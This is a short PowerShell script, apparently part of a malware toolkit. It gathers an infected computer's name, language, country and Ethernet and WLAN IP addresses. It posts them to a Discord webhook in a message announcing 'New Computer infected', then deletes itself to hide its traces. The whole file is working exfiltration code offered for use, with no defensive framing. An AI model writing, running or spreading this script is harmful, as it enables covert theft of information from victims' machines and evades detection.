## Get Webhook link from other file
param([string] $Webhook)

## Get all information for payload
try { 
    $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
} catch { 
    $ipEthernet = 'No Ethernet'
} 
try { 
    $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Wlan*).IPAddress
} 
catch { 
    $ipWlan = 'No Wlan' 
} 
$language = (Get-WinUserLanguageList)[0].autonym
$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
$country = $country.Substring(0, $country.length - 2)

## Write Payload
$description = 
"
New Computer infected 
---------------------------------
Computer Name = $env:computername 
Computer Language = $language
Location (country) = $country
Ethernet IP = $ipEthernet
WLan IP = $ipWlan
"

## Make Payload ready for Discord
$payload = [PSCustomObject]@{content=$description}

## Send Message to Discord
Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';

## Self Delete
Remove-Item $PSCommandPath -Force 